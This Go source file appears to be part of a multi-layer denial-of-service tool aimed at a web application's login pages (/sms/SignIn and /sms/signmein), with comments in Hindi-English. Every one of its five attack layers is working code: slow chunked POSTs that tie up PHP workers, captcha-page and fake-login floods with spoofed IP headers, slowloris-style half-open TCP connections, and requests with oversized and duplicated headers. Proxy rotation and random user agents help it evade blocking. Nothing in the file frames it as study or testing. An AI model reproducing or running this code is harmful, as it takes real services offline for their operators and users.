package main

import (
	"context"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"time"
)

// ============================================================
// LAYER 1: SLOW CHUNKED POST (PHP-FPM WORKER EXHAUSTION)
// POST /sms/signmein — har PHP worker ko 15-30s tak busy rakhta hai
// ============================================================
func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
	client := o.proxyMgr.NewClient()
	client.Timeout = 0

	baseURL := strings.TrimRight(o.target.String(), "/")
	targetURL := baseURL + "/sms/signmein"
	refererURL := baseURL + "/sms/SignIn"
	layerIdx := 0

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		body := slowLoginBody()

		req, err := http.NewRequestWithContext(ctx, "POST", targetURL, body)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Origin", o.target.Scheme+"://"+o.target.Host)
		req.Header.Set("Referer", refererURL)

		resp, err := client.Do(req)
		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)

		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		time.Sleep(time.Duration(rand.Intn(100)+20) * time.Millisecond)
	}
}

func slowLoginBody() io.Reader {
	r, w := io.Pipe()
	go func() {
		defer w.Close()
		w.Write([]byte("username=" + strings.Repeat("A", 512)))
		time.Sleep(time.Duration(rand.Intn(1000)+500) * time.Millisecond)
		w.Write([]byte("&password=" + strings.Repeat("B", 512)))
		time.Sleep(time.Duration(rand.Intn(1000)+500) * time.Millisecond)
		w.Write([]byte(fmt.Sprintf("&capt=%d", rand.Intn(20)+1)))
		for i := 0; i < 10; i++ {
			time.Sleep(time.Duration(rand.Intn(500)+200) * time.Millisecond)
			w.Write([]byte("&x" + fmt.Sprintf("%d", i) + "=" + strings.Repeat("Y", 64)))
		}
	}()
	return r
}

// ============================================================
// LAYER 2: CAPTCHA PAGE FLOOD (CPU + DB EXHAUSTION)
// GET /sms/SignIn — har request pe captcha generate + session create + DB hit
// ============================================================
func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
	client := o.proxyMgr.NewClientWithTimeout(10 * time.Second)
	baseURL := strings.TrimRight(o.target.String(), "/")
	targetURL := baseURL + "/sms/SignIn"
	layerIdx := 1

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		fullURL := fmt.Sprintf("%s?_=%d&r=%d", targetURL, time.Now().UnixNano(), rand.Int63())

		req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}

		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
		req.Header.Set("Pragma", "no-cache")

		resp, err := client.Do(req)
		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)

		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		time.Sleep(time.Duration(rand.Intn(5)) * time.Millisecond)
	}
}

// ============================================================
// LAYER 3: CACHE BYPASS + FAKE LOGIN POST
// POST /sms/signmein — fake credentials, PHP verify + DB check
// ============================================================
func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error {
	client := o.proxyMgr.NewClientWithTimeout(15 * time.Second)
	baseURL := strings.TrimRight(o.target.String(), "/")
	targetURL := baseURL + "/sms/signmein"
	refererURL := baseURL + "/sms/SignIn"
	layerIdx := 2

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// Fake login POST
		body := fmt.Sprintf("username=%s&password=%s&capt=%d",
			randomString(8+rand.Intn(16)),
			randomString(8+rand.Intn(16)),
			rand.Intn(20)+1)

		req, err := http.NewRequestWithContext(ctx, "POST", targetURL, strings.NewReader(body))
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Cache-Control", "no-cache")
		req.Header.Set("Origin", o.target.Scheme+"://"+o.target.Host)
		req.Header.Set("Referer", refererURL)
		req.Header.Set("X-Forwarded-For", randomIP())
		req.Header.Set("X-Real-IP", randomIP())

		resp, err := client.Do(req)
		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)

		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		time.Sleep(time.Duration(rand.Intn(10)) * time.Millisecond)
	}
}

// ============================================================
// LAYER 4: TCP CONNECTION TSUNAMI (KERNEL EXHAUSTION)
// Raw TCP connections — kernel ke file descriptors aur nf_conntrack table khatam
// HTTP nahi, seedha kernel level attack
// ============================================================
func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error {
	layerIdx := 3

	// Har worker multiple TCP connections kholta hai
	connectionsPerWorker := 50

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		// Connections ka pool kholo
		var conns []net.Conn
		for i := 0; i < connectionsPerWorker; i++ {
			select {
			case <-ctx.Done():
				for _, c := range conns {
					c.Close()
				}
				return ctx.Err()
			default:
			}

			conn, err := o.proxyMgr.dialer.Dial("tcp", o.target.Host)
			if err != nil {
				continue
			}

			// Incomplete HTTP request bhejo — Apache worker block
			partialReq := fmt.Sprintf(
				"POST /sms/signmein HTTP/1.1\r\nHost: %s\r\nContent-Length: 99999999\r\nConnection: keep-alive\r\n",
				o.target.Host,
			)
			// Note: deliberately NO final \r\n — request incomplete
			// Apache worker iska wait karega jab tak timeout na ho

			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			conn.Write([]byte(partialReq))

			conns = append(conns, conn)
			o.stats.TotalRequests.Add(1)
			o.stats.Layers[layerIdx].Requests.Add(1)
		}

		// Connections ko 20-40 seconds tak khula rakho
		deadline := time.Now().Add(time.Duration(rand.Intn(20)+20) * time.Second)
		for time.Now().Before(deadline) {
			select {
			case <-ctx.Done():
				for _, c := range conns {
					c.Close()
				}
				return ctx.Err()
			case <-time.After(time.Duration(rand.Intn(3000)+1000) * time.Millisecond):
			}

			// Keep-alive — chhota sa data bhej kar connection zinda rakho
			for _, conn := range conns {
				conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
				conn.Write([]byte("X-Keep-Alive: " + randomString(64) + "\r\n"))
			}
		}

		// Sab connections band karo
		for _, conn := range conns {
			conn.Close()
		}

		o.stats.SuccessRequests.Add(int64(connectionsPerWorker))
		o.stats.Layers[layerIdx].Success.Add(int64(connectionsPerWorker))
	}
}

// ============================================================
// LAYER 5: PARSER STRESS + OVERSIZED HEADERS
// Apache + PHP memory pressure via 16KB+ headers
// ============================================================
var oversizedHeaderNames = []string{
	"X-Custom-Data", "X-Tracking-ID", "X-Session-Token",
	"X-Analytics", "X-Device-Fingerprint", "X-Request-ID",
	"X-Correlation-ID", "X-Debug-Info", "X-Transaction-ID",
	"X-Auth-Token", "X-Client-ID", "X-Source-IP",
}

func layer5ParserStress(ctx context.Context, o *Orchestrator, workerID int) error {
	client := o.proxyMgr.NewClientWithTimeout(20 * time.Second)
	baseURL := strings.TrimRight(o.target.String(), "/")
	targetURL := baseURL + "/sms/SignIn"
	layerIdx := 4

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}

		req.Header.Set("User-Agent", randomUA())
		req.Header.Set("Connection", "keep-alive")

		// Multiple oversized headers (8KB-16KB each)
		req.Header.Set("X-Oversized-1", randomString(8192+rand.Intn(8192)))
		req.Header.Set("X-Oversized-2", randomString(8192+rand.Intn(8192)))

		for _, name := range oversizedHeaderNames {
			if rand.Intn(2) == 0 {
				req.Header.Set(name, randomString(4096+rand.Intn(4096)))
			}
		}

		// Duplicate headers — Apache merge karta hai → CPU waste
		for i := 0; i < 100; i++ {
			req.Header.Add("X-Duplicate-Header", "value-"+intToStr(i))
		}

		// Invalid encoding to confuse compression
		req.Header.Set("Accept-Encoding", "gzip;q=0, identity;q=0, *;q=0, br;q=0")
		req.Header.Set("Transfer-Encoding", "gzip, chunked, identity")

		resp, err := client.Do(req)
		o.stats.TotalRequests.Add(1)
		o.stats.Layers[layerIdx].Requests.Add(1)

		if err != nil {
			o.stats.FailedRequests.Add(1)
			o.stats.Layers[layerIdx].Fail.Add(1)
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		o.stats.SuccessRequests.Add(1)
		o.stats.Layers[layerIdx].Success.Add(1)

		time.Sleep(time.Duration(rand.Intn(50)+10) * time.Millisecond)
	}
}

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

var userAgents = []string{
	"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/151.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) AppleWebKit/605.1.15 Version/17.4 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
	"Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/125.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
	"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 Chrome/124.0 Mobile Safari/537.36",
	"Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
}

func randomUA() string {
	return userAgents[rand.Intn(len(userAgents))]
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

func randomString(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// Ensure net package is used
var _ = net.Dial
